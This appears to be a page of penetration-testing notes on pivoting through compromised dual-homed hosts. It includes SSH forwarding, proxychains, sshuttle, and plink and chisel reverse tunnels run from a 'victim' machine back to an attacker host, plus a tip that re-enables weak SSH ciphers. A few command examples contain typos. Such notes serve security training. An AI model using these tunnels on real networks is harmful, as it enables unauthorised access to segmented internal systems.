---
description: >-
  Very useful concepts for lateral movement. Some machines may not be directly
  accessible. Some machines that you land on may be dual homed and have multiple
  NIC's which allows access to a new network.
cover: https://0xsp.com/wp-content/uploads/2022/04/892677426.png
coverY: 2.0384967919340053
---

# 🔮 Pivoting & Tunneling

<mark style="color:yellow;">One important thing to look for is to look for IP addresses that are "hidden"</mark>

<mark style="color:yellow;">Look for ones that we did not see from the initial ping sweep</mark>

{% embed url="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html" %}

{% embed url="https://pentest.blog/explore-hidden-networks-with-double-pivoting/" %}

## Exploring Hidden Networks w/ Double Pivoting

### Introduction

Layered security is created to protect important services required by the concept of <mark style="color:yellow;">Defense-in-Depth.</mark>

* This is an easy concept, <mark style="color:yellow;">critical systems can not be on the same network with other systems</mark>
* However, this does NOT mean that they are 100% safe by any means

### What is Pivoting?

This is a process of <mark style="color:yellow;">accessing networks that we do NOT have access to under normal circumstances</mark>. <mark style="color:red;">This involves utilizing the additional network access that other compromised computers have</mark>.

* <mark style="color:yellow;">Does a compromised host have another NIC?</mark>
* It is likely that they have access to a different network that you cannot see
* <mark style="color:yellow;">With the concept of routing, an attacker can access hidden networks</mark>
* EVERY request to the new network is transmitted over the pivot
  * Think of this as a <mark style="color:yellow;">tunnel that the attacker can use to reach these networks</mark>

Topologically speaking, what does a host look like with two NIC's?

<figure><img src=".gitbook/assets/image (4) (1) (2).png" alt=""><figcaption></figcaption></figure>

### Initial Compromise Scenario

In this situation, a Meterpreter shell has been obtained on the "RD" system and it is connected to the DMZ network.

* <mark style="color:yellow;">After doing some network enumeration on the newly compromised host, we find out that "RD" has two NIC's</mark>

<mark style="color:yellow;">Topology BEFORE discovery of the hidden network:</mark>

<figure><img src=".gitbook/assets/image (2) (1) (2).png" alt=""><figcaption></figcaption></figure>

* NOTE: The router in the network does NOT have routing capability configured to communicate with the other network

<mark style="color:yellow;">Topology AFTER discovery of the hidden network (This is because "RD" has two NIC's):</mark>

<figure><img src=".gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">Due to the discovery of a single NIC on a compromised host, we were able to double our attack surface</mark>
* Our next objective should be to Nmap the newly discovered network.

### Nmap & Pivoting

* <mark style="color:yellow;">You need Proxychains and the usage of a SOCKS4 Proxy</mark>
* We can also use Metasploit for this process as well
* However, if we have SSH creds, we can use Dynamic SSH portforwarding and configure Proxychains to set up a SOCKS4 proxy on that specified port

How to do this?

SSH Syntax:

```
ssh -D 1337 RD@172.16.0.11
```

* This will port forward port 1337
* Once authenticated, we can then add socks4 127.0.0.1 1337 into /etc/proxychains.conf
* You can also choose to use 172.16.0.11 in place of localhost if that does not work

Once established, we can use proxychains to scan for hosts in the network:

```
proxychains nmap -sC -sV -oN 7.7.7.20
```

### Discovering Two Secret Networks Scenario

1. Attacked got an access to the RD machine which  was on same network with attacker.
2. And then he realise that RD machine has 2 network interface.
3. He defined an routing rule by usingautoroutepost module.
4. And then attacker performed  ARP and NMAP scanning on7.7.7.0/24network and found machine named as JC.
5. JC had a two different vulnerability. Easy File ShareandMS08-067.
6. Successfully exploitation of MS08-067 allowed attacker to gain an access to the7.7.7.20
7. Information gathering showed JC also have 2 network interface.
8. Another routing rule defined on7.7.7.20.
9. ARP and NMAP was used on8.8.8.0/24.
10. Vulnerable vsftp was running on8.8.8.9machine named as SK.
11. Final.

Topology:

<figure><img src=".gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

## Guides and Tools TLDR:

### Guides:

* Abatchy’s Port Forwarding Guide: [https://www.abatchy.com/2017/01/port-forwarding-practical-hands-on-guide](https://www.abatchy.com/2017/01/port-forwarding-practical-hands-on-guide)
* Windows Port Forwarding: [http://woshub.com/port-forwarding-in-windows/](http://woshub.com/port-forwarding-in-windows/)
* SSH Tunnelling Explained: [https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/](https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/)
* Understanding Proxy Tunnels: [https://www.offensive-security.com/metasploit-unleashed/proxytunnels/](https://www.offensive-security.com/metasploit-unleashed/proxytunnels/)
* Understanding Port forwarding with Metasploit: [https://www.offensive-security.com/metasploit-unleashed/portfwd/](https://www.offensive-security.com/metasploit-unleashed/portfwd/)
* Explore Hidden Networks with Double Pivoting: [https://pentest.blog/explore-hidden-networks-with-double-pivoting/](https://pentest.blog/explore-hidden-networks-with-double-pivoting/)
* 0xdf hacks stuff. Pivoting and Tunnelling: [https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html)

### Tools to help you with Port Forwarding and Pivoting:

* Proxychains: [https://github.com/haad/proxychains](https://github.com/haad/proxychains)
* Proxychains-ng: [https://github.com/rofl0r/proxychains-ng](https://github.com/rofl0r/proxychains-ng)
* SSHuttle (Totally Recommend learning this): [https://github.com/sshuttle/sshuttle](https://github.com/sshuttle/sshuttle)
* SSHuttle Documentation: [https://sshuttle.readthedocs.io/en/stable/](https://sshuttle.readthedocs.io/en/stable/)
* Chisel [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
* Ligolo: [https://github.com/sysdream/ligolo](https://github.com/sysdream/ligolo)

## Pivoting

Reference:

[Pivoting - Port forwarding - Tunneling](https://sushant747.gitbooks.io/total-oscp-guide/content/port\_forwarding\_and\_tunneling.html)

Context: You compromised one machine on a network and you want to go to the next machine. You will use the first machine as a staging point with your foothold to break into machine 2. The technique of using one compromised machine to access another is called pivoting. Machine one is the pivot in this example. The pivot is just used as a way to channel or funnel our attack.

#### Ipconfig:

* We are looking for machines that have at least three network interfaces such as (loopback, eth0, eth1, etc). These machines are connected to other networks and we can use them to pivot.

#### Commands:

```
# Windows
ipconfig /all
route print

#Linux
ifconfig
ifconfig -a
```

## Port Forwarding and Tunneling:

[https://www.youtube.com/watch?v=JDUrT3IEzLI](https://www.youtube.com/watch?v=JDUrT3IEzLI)

### Port Forwarding

* Context: You are on a network and you want to connect an FTP server or any other port to upload or download some files. However, someone put crazy firewall rules (egress) filters that prohibits outgoing traffic on all ports except port 80. How will you be able to connect our FTP server?
  * What we can do is add a machine that redirects/forwards all traffic that it receives on port 80 to port 21 on a different machine.

Instead of traffic looking like this:

```
PC1/port-21 -> FTP-server/port-21
```

It will look like this:

```
PC1/Port-80 -> Port-80/Proxy-Machine/Port-21 -> FTP-Server
```

* The other way around applies too in order to receive traffic.
* So, how do we implement this?

### Rinetd - Port Forward/Redirect

* We can set up this port forwarding machine with the help of rinetd.

Installing rinetd:

```
apt-get install rinetd
```

* We need to now modify the default config file that can be found in: /etc/rinetd.conf

Example/Use-Case:

* We have the following machines:
  * Machine1 (111.111.111.111), which is behind a firewall and wants to connect to machine3.
  * Machine2 (222.222.222.222), will forward all incoming connections to machine3.
  * Machine3 (333.333.333.333), Will host the ftp-server that machine1 wants to connect to.
* Within the config file, you will see bindaddress, bindport, connectaddress, and connectport. This is the essential part of the file that makes port forwarding possible with rinetd.
*   To make this happen we will add the follwing:

    ```
    # bindadress    bindport  connectaddress  connectport
    111.111.111.111    80     333.333.333.333       21
    ```
*   Now, restart the rinetd service to apply your changes:

    ```
    /etc/init.d/rinetd restart
    ```

Conclusion:

* The bind-address is where the proxy receives the connection and the connect-address is the machine it forwards the connection to.

### SSH Tunneling - Port Forwarding on SSH

Use Cases:

* You want to encrypt traffic that uses unencrypted protocols such as:
  * VNC, IMAP, IRC, etc.
* You are on a public network and want to encrypt all your HTTP traffic.
* You want to bypass firewall rules.

### Local Port Forwarding

The following will make Google available on address localhost:8080:

```
ssh -L 8080:www.google.com:80 localhost
```

You can also forward ports like this:

```
ssh username@<remote-machine> -L localport:target-ip:target-port

ssh username@192.168.1.111 -L 5000:192.168..1.222:5000
```

Now this port will be available on your localhost. So you can go to:

```
nc localhost:10000
```

### Remote Port Forwarding

* Remote port forwarding is a crazy, yet very simple concept. So imagine that you have compromised a machine and that machine has MYSQL running but it is only accessible via localhost. You cannot access it because you have a bad shell. One way to get around this is to just forward that port to our attacking machine.

Creating a remote port forward:

```
ssh <gateway> -R <remote port to bind>:<local host>:<local port>
```

* By the way, plink is an ssh-client for Windows that can be run from the terminal. The IP of the attacking machine is 111.111.111.111.

How-To:

1.  On the compromised machine, we do the following:

    ```
    plink.exe -l root -pw mysecretpassword 111.111.111.111 -R 3307:127.0.0.1:3306
    ```
2.  Now, we can check netstat on our attacking machine, we should see something like this:

    ```
    tcp        0      0 127.0.0.1:3307          0.0.0.0:*               LISTEN      19392/sshd: root@pt
    ```

    * This means that we can connect to that port on the attacking machine from the attacking machine.
3.  Connect using the following command:

    ```
    mysql -u root -p -h 127.0.0.1 --port=3307
    ```

### Dynamic Port Forwarding

* This can be used to dynamically forward all traffic from a specific application. This is really cool. With remote and local port forwarding, you are only forwarding a single port.
* However, this can be a hassle if your target machine has 10 ports open that you want to connect to. Instead, we can use a dynamic port forwarding technique.
*   Dynamic port forwarding sounds really complicated, but it is very easy to set up. Just set up the tunnel like this. After is is set up, do not run any commands in that session.

    ```
    # We connect to the machine we want to pivot from

    ssh -D 9050 user@192.168.1.111
    ```
*   Since proxychains uses 9050 by default (the default port for tor), we do not even need to configure proxychains.

    * To change that: /etc/proxychains.conf.

    ```
    proxychains nc 192.168.2.222 21
    ```

### Tunneling all HTTP/HTTPs traffic through SSH

* For this, we need 2 machines:
  1. Machine1 - 111.111.111.111
     1. This is the server that works as our proxy.
  2. Machine2
     1. This is the server that has a web browser.
* First we check out what the public IP address is. We do this so that we know the IP address before and after so we can verify that it works.
*   First, you set SSH to:

    ```
    # On machine2 we run
    ssh -D localhost:9999 root@111.111.111.111

    # This can also be ran with the -N flag
    ssh -D localhost:9999 root@111.111.111.111 -N
    ```
* Now you go to Firefox/settings/advanced/network and SOCKS to add 127.0.0.1 and port 9999.
  * WARNING: This setup will more than likely leak DNS. Do not use if you need opsec.
  * To fix this, you can go to about:config in Firefox (in the address bar) and then look for **network.proxy.socks\_remote\_dns**, and switch it to TRUE.
  * To check this: [https://ipleak.net/](https://ipleak.net/)
  * It will still say that we have WebRTC leaks.
    * To fix this: about:config and set the following to FALSE
      * media.peerconnection.established

## SSHuttle

* This is a great tool that can allow you to pivot across networks.

[https://www.youtube.com/watch?v=lGr7VUCBvOQ](https://www.youtube.com/watch?v=lGr7VUCBvOQ)

[https://github.com/sshuttle/sshuttle](https://github.com/sshuttle/sshuttle)

Installation:

```
apt-get install sshuttle
```

Usage:

```
sshuttle -r root@192.168.1.101 192.168.2.0/24
```

### Scenario-based usage

Context:

You have 3 machines

1. Kali -- <mark style="color:yellow;">192.168.1.169</mark> or 192.168.1.0/24
2. Edge Machine -- <mark style="color:yellow;">192.168.1.181</mark> or 192.168.1.0/24
3. Internal Machine -- <mark style="color:yellow;">192.168.2.101</mark> or 192.168.2.0/24

On Kali:

```
sshuttle -r edge_user@192.168.1.181 192.168.2.0/24
Local sudo Password:
edge_user@192.168.1.181's password:
client: Connected.
```

Open a new window

```
nmap -sP 192.168.2.0/24

ping 192.168.2.101

nmap 192.168.2.101
```

#### Workflow

Set a VPN through ssh.

Requirements:

* root access to the attacking machine
* simple user access at the ssh server

The simplest form is to run this from the attacker machine:

```
sudo sshuttle -vNHr victim_user@victim_host
```

The above command will create `iptables` `nat` rules to forward all networks that `victim_host` is connected to back to the attacker.

* `-H` automatically updates the local `/etc/hosts` with maching remote hostnames
* `-N` automatically attempts to route all subnets of the ssh server

Then, the attacker can simply use a tool to connect to the desired host/port inside the _internal_ network, which is normally inacessible, e.g.:

```
smbclient -L 172.16.45.130
```

If you went to use a specific ssh command to connect to the remote server, such as specifying your `rsa` private key, you can use the `-e` like so:

```
sshuttle -e "ssh -i id_rsa" -r victim_user@victim_host 172.168.1.0/24
```

The above command only routes subnet `172.168.1.0/24` back to the attacker

`sshuttle` actually has a wealth of additional functionalities, you can further refer to its man-page.

## Plink

#### Remote Tunnel

```
cmd.exe /c echo y | plink.exe -ssh -l [attacker_username] -pw [attacker_ssh_password] -R [attacker_ip]:[attacker_port]:[victim_ip]:[victim_port] [attacker_ip]
```

for example, suppose you have gained access at a dual-homed host and using this access, you want to access a port at another host that is not connected to the internet (you can't directly talk to it) but is accessible from the host you have access to:

* `attacker_ip` = 13.13.13.13
* `attacker_port` = 2222 (this is the final port that will accept the remote connection)
* `victim_ip` = 10.10.10.10 (IP of the inaccessible host)
* `victim_port` = 22 (Port of the inaccessible host that you will tunnel outside)

`cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R 13.13.13.13:2222:10.10.10.10:22 13.13.13.13`

#### Local Tunnel

If you don't want to do an SSH remote port forwarding, but a local one instead:

```
cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R [attacker_ip]:[attacker_port]:127.0.0.1:[victim_port] [attacker_ip]
```

The above command will forward the local `victim_port` at the host that you have access to, to your `attacker_ip`:`attacker_port`

In the commands above, the `cmd.exe /c echo y |` part can be ommited if you have previously accepted the server SSH certificate.

For the above to work, you need the following configuration at your SSH server: `GatewayPorts yes`

#### Plink Troubleshooting

* Check if architecture of plink and target system are compitable (32 bit & 64 bit).
* Check the version of plink, find newest version [here](https://www.putty.org/)
*   Key exchange algorithm troubleshooting:

    * FATAL ERROR: Couldn't agree a key exchange algorithm (available: curve25519-sha256,[curve25519-sha256@libssh.org](mailto:curve25519-sha256@libssh.org),ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256).
    * Solution: Try to edit **/etc/ssh/sshd\_config** and put the following to the top of the file:

    ```
     KexAlgorithms +diffie-hellman-group1-sha1
     Ciphers +aes128-cbc
    ```

    Stop ssh from attackers machine:

    ```
     systemctl stop ssh
    ```

    Regenerate the keys:

    ```
     ssh-keygen -A
    ```

    Start ssh again:

    ```
     systemctl start ssh
    ```

    Use again the plink (Victim machine)

## Chisel

#### Chisel Tunneling

You need to use the **same version for client and server** of chisel.

Server side (Attacker):

```
chisel server -p 8080 --reverse
```

Client Side (Victim):

```
chisel-x64.exe client [my_ip]:8080 R:socks 
```

After that use **proxychains** with port 1080 (default).

After version 1.5.0 chisel uses socks5 proxy.

#### Chisel Port Forwarding

You need to use the **same version for client and server** of chisel.

Server side (Attacker):

```
chisel server -p 12312 --reverse
```

Client Side (Victim):

```
chisel client [my_ip]:12312 R:[port]:127.0.0.1:[port]
```

## Checklist

```
#Multi-chained SSH pivoting

ssh -D 8888 -J sshusername@network1-IP,sshusername@network2-IP sshusername@network3-IP
```

```
#Sshuttle

sshuttle -vr sshusername@currently-connected-IP network2-IP
```
